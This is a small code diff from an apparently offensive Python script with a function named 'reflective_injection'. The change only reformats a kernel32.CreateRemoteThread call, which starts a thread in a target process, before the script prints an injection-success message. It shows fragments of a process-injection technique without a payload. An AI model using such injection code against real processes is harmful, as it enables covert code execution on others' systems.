@@ -73,7 +73,8 @@ def reflective_injection():
     lpParameter         = allocate_memory
     dwCreationFlags     = 0
     lpThreadId          = byref(thread_id)
-    code_execution = kernel32.CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId)
+    code_execution = kernel32.CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize,
+                                                 lpStartAddress, lpParameter, dwCreationFlags, lpThreadId)
     print("[+] Successful injection into PID: %s" %PID)
     
 if __name__ == '__main__':
